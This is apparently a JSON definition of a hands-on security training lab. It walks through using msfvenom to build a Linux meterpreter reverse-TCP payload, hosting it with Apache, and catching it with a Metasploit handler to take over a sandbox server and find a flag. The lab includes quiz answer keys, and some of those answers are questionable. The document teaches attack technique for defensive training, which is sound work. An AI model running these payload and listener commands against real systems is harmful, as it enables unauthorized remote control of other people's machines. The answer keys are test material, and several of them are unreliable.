{
  "title" : "Uploaded LAB 2 - Creating Infectious Media",
  "description" : "Using msfvenom to create a reverse shell on Linux system.",
  "prerequisites" : [ "Prepare msfvenom lession.", "Prepare reverse shell lession." ],
  "outcomes" : [ "Know how to use msfvenom.", "Know how to create a reverse shell.", "Get more knowledge and careful about what hacker can do to hijack your computer." ],
  "state" : "UNRELEASED",
  "show_stepper_bar" : true,
  "levels" : [ {
    "title" : "Introduction",
    "level_type" : "INFO_LEVEL",
    "order" : 0,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "content" : "Welcome to Lab 2 of our HOD Labs training series! In this lesson, we will delve into the fascinating world of using msfvenom to create a reverse shell on a Linux system.\n\nAs technology continues to evolve, so do the methods employed by both cybercriminals and cybersecurity professionals. Understanding how attackers exploit vulnerabilities is crucial in building robust defense mechanisms. Creating infectious media allows us to simulate real-world attack scenarios and gain valuable insights into potential vulnerabilities within our systems.\n\nThroughout this lesson, we will focus on msfvenom, a powerful tool provided by the Metasploit Framework. Msfvenom enables us to generate malicious payloads, which, when executed, can provide unauthorized access to target systems.\n\nOur specific objective will be to create a reverse shell on a Linux system. A reverse shell is a technique commonly used by attackers to gain control over a compromised machine, allowing them to execute commands and interact with the system remotely. By comprehending this attack method, we can better anticipate and defend against such threats.\n\nDuring this session, we will explore the fundamentals of using msfvenom to create a reverse shell payload. We will discuss various parameters, options, and techniques involved in crafting an effective payload. Additionally, we will cover essential concepts, such as listener setup and payload execution, to complete the attack cycle successfully.\n\nWhile we engage in the process of crafting infectious media, it is essential to remember that the knowledge gained should be utilized responsibly and solely for defensive purposes.\n\nGet ready to explore the intriguing world of Creating Infectious Media using msfvenom to create a reverse shell on a Linux system. Let's begin our journey towards a deeper understanding of offensive techniques, empowering us to fortify our defenses and safeguard our digital assets."
  }, {
    "title" : "Quick Knowledge Test",
    "level_type" : "ASSESSMENT_LEVEL",
    "order" : 1,
    "estimated_duration" : 12,
    "minimal_possible_solve_time" : null,
    "questions" : [ {
      "question_type" : "MCQ",
      "text" : "Which operating system is the focus of this lesson for creating a reverse shell?",
      "points" : 5,
      "penalty" : 5,
      "order" : 0,
      "answer_required" : true,
      "choices" : [ {
        "text" : "Windows",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "Linux",
        "correct" : true,
        "order" : 1
      }, {
        "text" : "macOS",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "Android",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "Which framework provides the msfvenom tool?",
      "points" : 5,
      "penalty" : 5,
      "order" : 1,
      "answer_required" : true,
      "choices" : [ {
        "text" : "Nmap",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "Wireshark",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "Metasploit",
        "correct" : true,
        "order" : 2
      }, {
        "text" : "Burp Suite",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "What is a reverse shell?",
      "points" : 5,
      "penalty" : 5,
      "order" : 2,
      "answer_required" : true,
      "choices" : [ {
        "text" : "A shell script that executes commands on a target system",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "A technique to remotely control a compromised machine",
        "correct" : true,
        "order" : 1
      }, {
        "text" : "A method to defend against malware infections",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "A tool for generating malicious payloads",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "What is the main purpose of using msfvenom to create a reverse shell?",
      "points" : 5,
      "penalty" : 5,
      "order" : 3,
      "answer_required" : true,
      "choices" : [ {
        "text" : "To simulate real-world attack scenarios",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "To gain unauthorized access to target systems",
        "correct" : true,
        "order" : 1
      }, {
        "text" : "To defend against potential vulnerabilities",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "To enhance system security",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "What is the purpose of listener setup in the reverse shell attack cycle?",
      "points" : 5,
      "penalty" : 5,
      "order" : 4,
      "answer_required" : true,
      "choices" : [ {
        "text" : "To generate the malicious payload",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "To identify potential vulnerabilities",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "To analyze network traffic",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "To establish a remote connection to the target system",
        "correct" : true,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "Which msfvenom option is used to specify the payload to be used for generating the reverse shell?",
      "points" : 5,
      "penalty" : 5,
      "order" : 5,
      "answer_required" : true,
      "choices" : [ {
        "text" : "-p",
        "correct" : true,
        "order" : 0
      }, {
        "text" : "-l",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "-e",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "-a",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "What is the purpose of encoding the payload with msfvenom?",
      "points" : 5,
      "penalty" : 5,
      "order" : 6,
      "answer_required" : true,
      "choices" : [ {
        "text" : "To make the payload undetectable by antivirus software.",
        "correct" : true,
        "order" : 0
      }, {
        "text" : "To encrypt the payload to prevent unauthorized access.",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "To compress the payload for faster transmission.",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "To obfuscate the payload to confuse security analysts.",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "In msfvenom, which option is used to specify the number of times the payload should be encoded?",
      "points" : 5,
      "penalty" : 5,
      "order" : 7,
      "answer_required" : true,
      "choices" : [ {
        "text" : "-n",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "-i",
        "correct" : true,
        "order" : 1
      }, {
        "text" : "-e",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "-r",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "To create a payload that is compatible with a specific Linux shell, which msfvenom option should be used?",
      "points" : 5,
      "penalty" : 5,
      "order" : 8,
      "answer_required" : true,
      "choices" : [ {
        "text" : " -b",
        "correct" : false,
        "order" : 0
      }, {
        "text" : " -f",
        "correct" : true,
        "order" : 1
      }, {
        "text" : "-p",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "-a",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "What does the \"--platform\" option in msfvenom allow you to specify?",
      "points" : 5,
      "penalty" : 5,
      "order" : 9,
      "answer_required" : true,
      "choices" : [ {
        "text" : "The architecture of the target system.",
        "correct" : true,
        "order" : 0
      }, {
        "text" : "The operating system on the attacker's machine.",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "The type of payload to be generated.",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "The preferred encoding method for the payload.",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "Which msfvenom option is used to specify a custom template file for the generated payload?",
      "points" : 5,
      "penalty" : 5,
      "order" : 10,
      "answer_required" : true,
      "choices" : [ {
        "text" : "--template",
        "correct" : true,
        "order" : 0
      }, {
        "text" : "--encrypt",
        "correct" : false,
        "order" : 1
      }, {
        "text" : " --format",
        "correct" : false,
        "order" : 2
      }, {
        "text" : " --template-str",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "What is the purpose of using a stager in the msfvenom payload generation process?",
      "points" : 5,
      "penalty" : 5,
      "order" : 11,
      "answer_required" : true,
      "choices" : [ {
        "text" : "To enhance the functionality of the payload.",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "To obfuscate the payload and make it more difficult to detect.",
        "correct" : false,
        "order" : 1
      }, {
        "text" : " To establish a connection to the target system before delivering the full payload.",
        "correct" : true,
        "order" : 2
      }, {
        "text" : "To provide additional configuration options for the payload.",
        "correct" : false,
        "order" : 3
      } ]
    } ],
    "instructions" : "Answer questions and move on to next phase.",
    "assessment_type" : "TEST"
  }, {
    "title" : "Get Access",
    "level_type" : "ACCESS_LEVEL",
    "order" : 2,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "passkey" : "start-training-lab-2",
    "cloud_content" : "Your first task is to access the sandbox, where you will complete all following tasks.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`client`** and then click on **`Open console`**, and a new pop-up window will appear. \n2. Login with username **`client`** and password **`password`**. (*You may want to login into the client with multiple session in terminals which maybe easier for doing this lab*)\n3. After you have successfully connected, Submit the answer **`start-training-lab-2`**.\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.crp.kypo.muni.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.\n",
    "local_content" : "Before proceeding further, you need to start a sandbox on your machine. \nPlease clone [this Gitlab repository](https://<link_to_a_repo>) and follow steps in the README file.\nWhen your sandbox is ready at your host, submit the passkey from the README file."
  }, {
    "title" : "Generate the Reverse Shell Payload",
    "level_type" : "TRAINING_LEVEL",
    "order" : 3,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "ifconfig",
    "answer_variable_name" : null,
    "content" : "# Execute the following command to generate the reverse shell payload using msfvenom:\n\n`sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<your IP address> LPORT=<PORT> -f elf -o /var/www/html/shell-x64.elf`\n\n# Explain:\n-p: Specifies the payload to use for generating the shellcode. In this case, linux/x64/meterpreter_reverse_tcp is the payload, which is a reverse TCP meterpreter payload for 64-bit Linux systems.\n\nLHOST: This is a variable that represents your IP address. It should be replaced with your actual IP address.\n\nLPORT: This is a variable that represents the port number on which the meterpreter will listen for incoming connections. It should be replaced with the desired port number. My recommend is using the uncommon PORT.\n\n-f: Specifies the output format of the payload. In this case, elf is the format, which stands for Executable and Linkable Format, commonly used for Linux executables.\n\n-o: Specifies the output file where the generated payload will be saved. In this case, the payload will be saved in the file /var/www/html/shell-x64.elf. The /var/www/html/ directory is often used for serving web content, so this would make the payload accessible via a web server if it's running on the system.\n\n\n## Q: What the command in CLI Linux OS you use to get your IP address?",
    "solution" : "You can find the answer [here](https://www.ibm.com/docs/en/aix/7.2?topic=i-ifconfig-command)",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Start the Apache Web Server",
    "level_type" : "TRAINING_LEVEL",
    "order" : 4,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "/var/www/html/",
    "answer_variable_name" : null,
    "content" : "# Execute command to start the Apache web server.\n\n\n## Q: Where is the directory that these content in it was hosted by apache to the internet?  \n(Format: /dirA/dirB/dirC/)",
    "solution" : "# In the terminal, execute the following command to start the Apache web server:\n\n`sudo service apache2 start`\n\n\n# Answer for the main question can be found in previous step.",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Launch Metasploit Framework",
    "level_type" : "TRAINING_LEVEL",
    "order" : 5,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "msfconsole",
    "answer_variable_name" : null,
    "content" : "# In this step, you have to find a command to launch the Metasploit Framework console then execute it.\n\n## Q: The command is also the answer for this step.",
    "solution" : "You can find the answer [here](https://www.offsec.com/metasploit-unleashed/msfconsole/)",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Configure Metasploit for Reverse Shell Handling",
    "level_type" : "TRAINING_LEVEL",
    "order" : 6,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "tcp",
    "answer_variable_name" : null,
    "content" : "# Within the Metasploit console, execute the following commands:\n\n`use exploit/multi/handler`\n\n`set PAYLOAD linux/x64/meterpreter_reverse_tcp`\n\n`set LPORT <PORT>`\n\n`set LHOST <IP address>`\n\n# Explain:\nuse exploit/multi/handler: This command sets the current context to use the 'exploit/multi/handler' module. This module is responsible for setting up a listener to catch incoming connections from exploited targets.\n\nset PAYLOAD linux/x64/meterpreter_reverse_tcp: This command sets the payload to be used in the exploit to 'linux/x64/meterpreter_reverse_tcp'. It specifies the type of payload that will be delivered to the target system.\n\nset LPORT <PORT>: This command sets the local port (LPORT) for the listener. It specifies the port on which the Metasploit handler will listen for incoming connections from exploited systems.\n\nset LHOST <IP address>: This command sets the local host (LHOST) for the listener. It specifies the IP address of the machine where the Metasploit handler is running.\n\n## Q: What protocol you use for configure this reverse shell? (lowercase)",
    "solution" : "(Example for protocol format: http, udp, ftp, ...). Now you know the answer!",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Exploit with Reverse Shell",
    "level_type" : "TRAINING_LEVEL",
    "order" : 7,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "Top_Secret_Flag",
    "answer_variable_name" : null,
    "content" : "# Initiate the reverse shell exploit.\n\n# Then wait a few seconds for the server get hijack by your reverse shell code.\n\n## Q: After you get into the victim (server) machine, you must find a flag to submit it. ",
    "solution" : "# Execute the following command to initiate the reverse shell exploit:\n\n`exploit`\n\n# The flag is lays around somewhere at /home/ folder.",
    "solution_penalized" : true,
    "hints" : [ {
      "title" : "Hint for flag",
      "content" : "The author like the song 'Sweet /home/ Alabama' . Maybe you find your ~~g4lf~~self interested in it too.",
      "hint_penalty" : 5,
      "order" : 0
    } ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  } ],
  "estimated_duration" : 62,
  "variant_sandboxes" : false
}